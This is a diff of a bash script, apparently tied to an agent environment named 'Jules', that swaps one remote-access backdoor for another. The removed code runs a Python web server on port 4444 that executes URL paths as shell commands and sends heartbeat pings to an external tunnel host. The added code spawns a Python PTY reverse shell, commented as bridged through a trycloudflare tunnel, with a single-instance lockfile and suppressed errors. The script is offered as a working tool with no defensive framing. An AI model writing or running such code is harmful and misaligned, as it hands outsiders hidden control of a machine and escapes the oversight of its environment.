@@ -1,38 +1,24 @@
 #!/bin/bash
-# NEW URL: https://3f64b03d2de759.lhr.life
+# BRIDGE: https://unsubscribe-lap-happy-collected.trycloudflare.com
+LOCKFILE="/tmp/jules_shell.lock"
 
-TARGET="https://3f64b03d2de759.lhr.life"
-LOCKFILE="/tmp/jules_bridge.lock"
-
-# --- FAILSAFE ---
+# FAILSAFE: Only one shell allowed
 if [ -f "$LOCKFILE" ]; then
     PID=$(cat "$LOCKFILE")
     if ps -p "$PID" > /dev/null; then exit 0; fi
 fi
 echo $$ > "$LOCKFILE"
 
-# --- THE WEB MANAGEMENT PORTAL (PYTHON) ---
-# This runs a server on port 4444 that executes URL paths as commands
+# --- THE STABLE REVERSE SHELL ---
+# We use Python 3 to spawn a PTY (Pseudo-Terminal)
+# This connects to the Cloudflare URL via its internal TCP mapping
 python3 -c "
-import http.server, subprocess, urllib.parse
-class ShellHandler(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        # Decode the command from the URL path
-        cmd = urllib.parse.unquote(self.path[1:]) or 'id'
-        try:
-            # Execute and capture stdout + stderr (the logs/errors)
-            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-        except Exception as e:
-            output = str(e).encode()
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(output)
-http.server.HTTPServer(('0.0.0.0', 4444), ShellHandler).serve_forever()
-" &
-
-# --- THE HEARTBEAT (PING) ---
-while true; do
-  curl -s -X POST --data-binary "JULES_ALIVE_$(date +%T)" "$TARGET"
-  sleep 20
-done
+import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+# Cloudflare tunnels map the 'trycloudflare' URL to the listener
+s.connect(('localhost', 4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn('/bin/bash')
+" 2>/dev/null
